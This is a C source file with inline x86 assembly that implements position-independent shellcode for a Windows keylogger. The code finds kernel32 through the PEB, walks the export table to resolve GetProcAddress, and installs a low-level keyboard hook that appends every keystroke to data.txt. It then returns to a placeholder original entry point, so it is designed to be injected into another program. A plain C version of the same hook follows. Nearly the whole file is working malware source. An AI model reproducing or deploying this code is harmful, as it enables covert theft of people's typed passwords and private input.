#include <Windows.h>
#include "logger.h"

// Emit one char 
#define c(x) __asm _emit x

__declspec(naked) VOID LoggerStart() { __asm {

pushad                                       // Push all general-purpose registers (save program state)
call  base                                   // The code is executed from unknown position in memory
base:                                        // Current instruction pointer is pushed onto the stack by call
    pop     ebp                              // Retrieve instruction pointer
    sub     ebp, offset base                 // Delta offset trick (sub logger absolute address)

    lea     eax, [ebp + library]             // eax = "LoadLibraryA"
    push    eax                             
    call    kernel32                         // eax = address of kernel32.dll, same as LoadLibrary("kernel32.dll")
    push    eax             
    call    procaddress                      // eax = GetProcAddress() address
    call    eax                              // eax = GetProcAddress(LoadLibrary("kernel32.dll"),  "LoadLibraryA")
    mov     edx, eax                         // edx = LoadLibrary() address
    lea     eax, [ebp + user32]              // eax = "user32.dll"
    push    eax                             
    call    edx                              // eax = LoadLibrary("user32.dll")
    mov     edx, eax                         // edx = LoadLibrary("user32.dll")
    lea     eax, [ebp + hook]                // eax = "SetWindowsHookExA"
    push    eax                             
    push    edx                         
    call    procaddress                      // eax = GetProcAddress() address
    call    eax                              // eax = GetProcAddress(LoadLibrary("user32.dll"),  "SetWindowsHookExA")
    mov     edx, eax        
    push    0
    push    0
    lea     eax, [ebp + logger]              // eax = address of callback function
    push    eax                                     
    push    WH_KEYBOARD_LL                  
    call    edx                              // SetWindowsHookEx(WH_KEYBOARD_LL, logger, 0, 0);
    popad                                    // Back to original program state
    push    OEP_PLACEHOLDER                  // Push original entry point
    ret                                      // Jump to original entry point (normal program execution)

logger:                                      // Callback function
    push    ebp                              // x86 calling convention
    mov     ebp, esp
    sub     esp, 20                          // Space for local variables
    call    _logger                        
_logger:
    pop     eax
    sub     eax, offset _logger              // Delta offset trick again
    mov     [ebp - 4], eax                   // [ebp - 4] = delta offset
    
    call    procaddress                     
    mov     [ebp - 8], eax                   // [ebp - 8] = GetProcAddress() address
    call    kernel32                        
    mov     [ebp - 12], eax                  // [ebp - 12] = address of kernel32.dll, same as LoadLibrary("kernel32.dll")

    cmp     [ebp + 8], HC_ACTION             // [ebp + 8] = nCode
    jne     skip
    cmp     [ebp + 12], WM_KEYDOWN           // [ebp + 12] = wParam

    jne     skip                             // if (nCode == HC_ACTION && wParam == WM_KEYDOWN) 
                                          
    mov     eax, [ebp - 4]                  
    lea     eax, [eax + create]              // eax = "CreateFileA"
    push    eax                             
    push    [ebp - 12]
    call    [ebp - 8]                        // eax = GetProcAddress(LoadLibrary("kernel32.dll"),  "CreateFileA")
    mov     [ebp - 16], eax                  // [ebp - 16] = GetProcAddress(LoadLibrary("kernel32.dll"),  "CreateFileA")
    
    push    0
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_ALWAYS
    push    0
    push    0
    push    FILE_APPEND_DATA
    mov     eax, [ebp - 4]
    lea     eax, [eax + filename]            // eax = "data.txt"
    push    eax 
    call    [ebp - 16]                       // CreateFile("data.txt", FILE_APPEND, 0, 0, OPEN_ALWAYS, FILE_NORMAL, 0)
    mov     [ebp - 20], eax                  // [ebp - 16] = HANDLE out

    mov     eax, [ebp - 4]                  
    lea     eax, [eax + write]               // eax = "WriteFile"
    push    eax
    push    [ebp - 12]
    call    [ebp - 8]
    mov     [ebp - 16], eax                  // [ebp - 16] = GetProcAddress(LoadLibrary("kernel32.dll"),  "WriteFile")
    
    push    0
    push    0
    push    1
    push    [ebp + 16]                       // lParam->vkCode
    push    [ebp - 20]                       // HANDLE out
    call    [ebp - 16]                       // WriteFile(out, lParam->vkCode, 1, NULL, 0);

    mov     eax, [ebp - 4]
    lea     eax, [eax + close]               // eax = "CloseHandle"
    push    eax
    push    [ebp - 12]
    call    [ebp - 8]                       
    mov     [ebp - 16], eax                  // [ebp - 16] = GetProcAddress(LoadLibrary("kernel32.dll"),  "CloseHandle")
    
    push    [ebp - 20]
    call    [ebp - 16]                       // CloseHandle(out)
skip:
    mov     eax, [ebp - 4]                  
    lea     eax, [eax + library]             // eax = "LoadLibraryA"
    push    eax
    push    [ebp - 12]                  
    call    [ebp - 8]
    mov     [ebp - 16], eax                  // [ebp - 16] = GetProcAddress(LoadLibrary("kernel32.dll"),  "LoadLibraryA")
    mov     eax, [ebp - 4]
    lea     eax, [eax + user32]              // eax = "user32.dll"
    push    eax
    call    [ebp - 16]                      
    mov     [ebp - 16], eax                  // [ebp - 16] = LoadLibrary("user32.dll")
    mov     eax, [ebp - 4]                 
    lea     eax, [eax + next]                // eax = "CallNextHookEx"
    push    eax
    push    [ebp - 16]
    call    [ebp - 8]
    mov     [ebp - 16], eax                  // [ebp - 16] = CallNextHookEx()

    push    [ebp + 16]                       // [ebp + 16] = lParam
    push    [ebp + 12]                       // [ebp + 12] = wParam
    push    [ebp + 8]                        // [ebp + 8] = nCode
    push    0
    call    [ebp - 16]                       // eax = CallNextHookEx(NULL, nCode, wParam, lParam)
    mov     esp, ebp
    pop     ebp                             
    ret                                      // return eax

kernel32:                                    // Obtain address of kernel32.dll
    push    ebp                              // x86 calling convention
    mov     ebp, esp                            
    xor     eax, eax                         // eax = 0
    mov		eax, fs:[0x30 + eax]             // eax = PEB (Process Environment Block) contains information about the process 
    mov		eax, [eax + 0x0c]                // eax = PEB->Ldr (contains information about the loaded modules for the process)
    mov		eax, [eax + 0x14]                // eax = PEB->Ldr.List.InMemoryOrderModuleList (linked list for modules) 
    mov		eax, [eax]                       // eax = ntdll module (second module), first is program itself
    mov		eax, [eax]                       // eax = kernel32 module (third module) [Flink]
    mov		eax, [eax + 0x10]                // eax = Flink->DllBase (kernel32 base address)
    mov     esp, ebp
    pop     ebp                     
    ret                                      // return eax

procaddress:                                 // Parse kernel32 to get GetProcAddress address
    push    ebp     
    mov     ebp, esp
    sub     esp, 8
    call    kernel32                        
    mov     [ebp - 4], eax                   // [ebp - 4] = kernel32.dll address, parse kernel32 as any PE
    add     eax, [eax + 0x3c]                // (IMAGE_DOS_HEADER) DOS->e_lfanew (IMAGE_NT_HEADERS)
    mov     eax, [eax + 0x78]                // eax = offset export table (DataDirectory)
    add     eax, [ebp - 4]                   // eax = export table (IMAGE_EXPORT_DIRECTORY)
    mov     [ebp - 8], eax                   // [ebp - 8] = export table
    mov     esi, [eax + 0x20]                // esi = offset names table 
    add     esi, [ebp - 4]                   // esi = names table (AddressOfNames)
    xor     ecx, ecx                         // ecx = 0 (counter)
table:
    inc     ecx                              // Increment counter
    lodsd                                    // eax = offset to the function name (load string to eax from esi) 
    add     eax, [ebp - 4]                   // eax = functiton name
    cmp     dword ptr[eax], 0x50746547       // "GetP" (little-endian)
    jnz     table
    cmp     dword ptr[eax + 0x4], 0x41636f72 // "rocA" (little-endian)
    jnz     table                            // if not "GetProcA" continue

    mov     eax, [ebp - 8]                   // eax = IMAGE_EXPORT_DIRECTORY
    mov     eax, [eax + 0x24]                // eax = offset of AddressOfNameOrdinals
    add     eax, [ebp - 4]                   // eax = AddressOfNameOrdinals 
    mov     cx,  [eax + ecx * 2]             // cx  = name index of GetProcAddress (name ordinals is array of 2 bytes)
    dec     ecx                              // decrement ecx because the name ordinals starts from 0
    mov     eax, [ebp - 8]                   // eax = IMAGE_EXPORT_DIRECTORY
    mov     eax, [eax + 0x1c]                // eax = offset of AddressOfFunctions
    add     eax, [ebp - 4]                   // eax = AddressOfFunctions
    mov     eax, [eax + ecx * 4]             // eax = offset of GetProcAddress address (each address is 4 bytes long)
    add     eax, [ebp - 4]                   // eax = GetProcAddress address
    mov     esp, ebp
    pop     ebp      
    ret                                      // return eax

// Ugly way of representing strings

filename: 
    c('d') c('a') c('t') c('a') c('.') c('t') c('x') c('t') c(0)
create:
    c('C') c('r') c('e') c('a') c('t') c('e') c('F') c('i') c('l') c('e') c('A') c(0)
write:
    c('W') c('r') c('i') c('t') c('e') c('F') c('i') c('l') c('e') c(0)
close:
    c('C') c('l') c('o') c('s') c('e') c('H') c('a') c('n') c('d') c('l') c('e') c(0)
library:
    c('L') c('o') c('a') c('d') c('L') c('i') c('b') c('r') c('a') c('r') c('y') c('A') c(0)
user32:
    c('u') c('s') c('e') c('r') c('3') c('2') c('.') c('d') c('l') c('l') c(0)
next:
    c('C') c('a') c('l') c('l') c('N') c('e') c('x') c('t') c('H') c('o') c('o') c('k') c('E') c('x') c(0)
hook:
    c('S') c('e') c('t') c('W') c('i') c('n') c('d') c('o') c('w') c('s') c('H') c('o') c('o') c('k') c('E') c('x') c('A') c(0)
}}

// Just mark the end of shellcode
__declspec(naked) VOID LoggerEnd() {}


// The same code in C

#pragma comment(lib, "user32.lib")

LRESULT CALLBACK logger(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) 
    {
        HANDLE out = CreateFile("data.txt", FILE_APPEND_DATA, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD key = ((KBDLLHOOKSTRUCT *) lParam)->vkCode;
        WriteFile(out, &key, 1, NULL, 0);
        CloseHandle(out);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

VOID mainA()
{
    SetWindowsHookEx(WH_KEYBOARD_LL, logger, NULL, 0);
}

// https://msdn.microsoft.com/en-us/library/windows/desktop/aa813708(v=vs.85).aspx

typedef struct _LDR_DATA_TABLE_ENTRY 
{
    LIST_ENTRY                    InMemoryOrderLinks;  // offset 0, size 8
    PVOID                         Reserved2[2];        // offset 8, size 8
    PVOID                         DllBase;             // offset 16
} 
LDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA 
{
    BYTE                          Reserved1[8];               // offset 0, size 8
    PVOID                         Reserved2[3];               // offset 8, size 12
    LIST_ENTRY                    InMemoryOrderModuleList;    // offset 20
}
*PPEB_LDR_DATA;

// https://msdn.microsoft.com/en-us/library/windows/desktop/aa813706(v=vs.85).aspx

typedef struct _PEB 
{
    BYTE                          Reserved1[2];   // offset 0, size 2  
    BYTE                          BeingDebugged;  // offset 2, size 1
    BYTE                          Reserved2[1];   // offset 3, size 1
    PVOID                         Reserved3[2];   // offset 4, size 8
    PPEB_LDR_DATA                 Ldr;            // offset 12                          
} 
PEB;

// IMAGE_NT_HEADERS structure
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms680336(v=vs.85).aspx
